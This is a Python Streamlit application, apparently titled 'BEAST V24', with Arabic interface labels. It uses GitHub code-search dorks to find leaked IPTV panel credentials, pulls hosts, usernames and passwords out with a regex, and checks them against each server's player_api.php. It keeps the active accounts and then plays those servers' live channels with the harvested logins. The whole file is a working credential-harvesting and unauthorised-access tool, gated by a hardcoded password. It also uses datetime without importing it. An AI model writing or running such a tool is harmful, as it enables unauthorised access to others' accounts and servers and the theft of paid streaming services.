import streamlit as st
import requests
import re
import time

# --- إعدادات الصفحة والهوية ---
st.set_page_config(page_title="BEAST V24 PRO MAX", layout="wide", initial_sidebar_state="collapsed")

# --- نظام إدارة الحالة (Session State) ---
if "auth" not in st.session_state: st.session_state.auth = False
if "page" not in st.session_state: st.session_state.page = "search" # search OR player
if "active_server" not in st.session_state: st.session_state.active_server = None
if "hits" not in st.session_state: st.session_state.hits = []

# --- نظام الدخول ---
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V24 - ULTIMATE FEED</h1>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1,1.5,1])
    with col2:
        pwd = st.text_input("Password:", type="password")
        if st.button("دخول النظام"):
            if pwd == "BEAST_V17_PRO":
                st.session_state.auth = True
                st.rerun()
            else: st.error("❌ كلمة المرور خاطئة")
    st.stop()

# --- التنسيق الجمالي (CSS) ---
st.markdown("""
<style>
    .stApp { background-color: #050505; color: white; }
    .server-card { 
        background: #111; border: 1px solid #222; padding: 15px; 
        border-radius: 10px; margin-bottom: 10px; transition: 0.3s;
    }
    .server-card:hover { border-color: #00ff41; box-shadow: 0 0 10px #00ff4133; }
    .channel-item {
        padding: 10px; background: #1a1a1a; border-radius: 5px;
        margin-bottom: 5px; cursor: pointer; border-left: 3px solid transparent;
    }
    .channel-item:hover { background: #333; border-left: 3px solid #00ff41; }
    .status-active { color: #00ff41; font-weight: bold; }
</style>
""", unsafe_allow_html=True)

# --- الواجهة الأولى: محرك البحث والفحص ---
if st.session_state.page == "search":
    st.title("⚡ BEAST V24 - Scanner Dashboard")
    
    with st.sidebar:
        st.header("⚙️ إعدادات الهجوم")
        gh_token = st.text_input("GitHub Token:", type="password")
        scan_pages = st.slider("عمق البحث (صفحات)", 5, 100, 20)
        start_btn = st.button("🚀 ابدأ جلب السيرفرات")
        if st.button("🧹 تفريغ النتائج"):
            st.session_state.hits = []
            st.rerun()

    # منطقة العرض
    radar = st.empty()
    
    # محرك البحث
    if start_btn and gh_token:
        headers = {'Authorization': f'token {gh_token}', 'Accept': 'application/vnd.github.v3+json'}
        dorks = [
            'extension:txt "get.php?username=" "password="',
            'extension:m3u "player_api.php"',
            'extension:php "panel_api.php" username password',
            '"http://" "username=" "password=" "port" extension:txt'
        ]
        
        for dork in dorks:
            for p in range(1, scan_pages + 1):
                try:
                    url = f"https://api.github.com/search/code?q={dork}&page={p}&per_page=50"
                    res = requests.get(url, headers=headers).json()
                    
                    if "items" not in res:
                        radar.warning("⚠️ GitHub Rate Limit! انتظر ثواني...")
                        time.sleep(5); continue
                        
                    for item in res['items']:
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        content = requests.get(raw_url, timeout=3).text
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        
                        for m in matches:
                            host, user, pw = m[0], m[1], m[2]
                            radar.info(f"🔍 فحص: {host}")
                            try:
                                check = requests.get(f"{host}/player_api.php?username={user}&password={pw}", timeout=2).json()
                                if check.get("user_info", {}).get("status") == "Active":
                                    hit_data = {"host": host, "user": user, "pw": pw, "info": check.get("user_info")}
                                    if hit_data not in st.session_state.hits:
                                        st.session_state.hits.append(hit_data)
                            except: continue
                except: continue
        radar.success("✅ اكتمل الفحص!")

    # عرض النتائج الشغالة
    for idx, hit in enumerate(st.session_state.hits):
        with st.container():
            col_a, col_b = st.columns([4, 1])
            with col_a:
                st.markdown(f"""
                <div class="server-card">
                    <span class="status-active">● ACTIVE SERVER</span> | <b>HOST:</b> {hit['host']}<br>
                    <small>User: {hit['user']} | Exp: {datetime.fromtimestamp(int(hit['info'].get('exp_date', 0))).strftime('%Y-%m-%d') if hit['info'].get('exp_date') else 'Unlimited'}</small>
                </div>
                """, unsafe_allow_html=True)
            with col_b:
                if st.button(f"📺 تشغيل الآن", key=f"play_{idx}"):
                    st.session_state.active_server = hit
                    st.session_state.page = "player"
                    st.rerun()

# --- الواجهة الثانية: صفحة المشغل الاحترافية ---
elif st.session_state.page == "player":
    srv = st.session_state.active_server
    
    # هيدر المشغل
    col_back, col_title = st.columns([1, 10])
    with col_back:
        if st.button("⬅️ عودة"):
            st.session_state.page = "search"
            st.rerun()
    with col_title:
        st.subheader(f"📺 BEAST PLAYER - Connected to: {srv['host']}")

    # جلب القنوات
    @st.cache_data(ttl=600)
    def get_channels(h, u, p):
        try:
            r = requests.get(f"{h}/player_api.php?username={u}&password={p}&action=get_live_streams", timeout=5).json()
            return r
        except: return []

    channels = get_channels(srv['host'], srv['user'], srv['pw'])
    
    if channels:
        col_list, col_view = st.columns([1, 3])
        
        with col_list:
            st.markdown("### 📋 القنوات")
            search_ch = st.text_input("🔍 بحث في القنوات...")
            # قائمة القنوات قابلة للتمرير
            with st.container():
                for ch in channels:
                    if search_ch.lower() in ch['name'].lower():
                        if st.button(f"▪️ {ch['name'][:25]}", key=f"ch_btn_{ch['stream_id']}", use_container_width=True):
                            st.session_state.current_stream = f"{srv['host']}/live/{srv['user']}/{srv['pw']}/{ch['stream_id']}.m3u8"
        
        with col_view:
            if "current_stream" in st.session_state:
                st.markdown(f"""
                <div style="border: 2px solid #00ff41; border-radius: 10px; overflow: hidden; background: #000;">
                    <link href="https://vjs.zencdn.net/7.20.3/video-js.css" rel="stylesheet" />
                    <video id="my-video" class="video-js vjs-big-play-centered" controls preload="auto" width="100%" height="500" data-setup='{{"fluid": true}}'>
                        <source src="{st.session_state.current_stream}" type="application/x-mpegURL">
                    </video>
                    <script src="https://vjs.zencdn.net/7.20.3/video.min.js"></script>
                </div>
                """, unsafe_allow_html=True)
                st.write(f"🔗 رابط المباشر: `{st.session_state.current_stream}`")
            else:
                st.info("👈 اختر قناة من القائمة الجانبية لبدء البث المباشر")
    else:
        st.error("❌ فشل جلب القنوات من هذا السيرفر أو السيرفر لا يحتوي على قنوات مباشرة.")
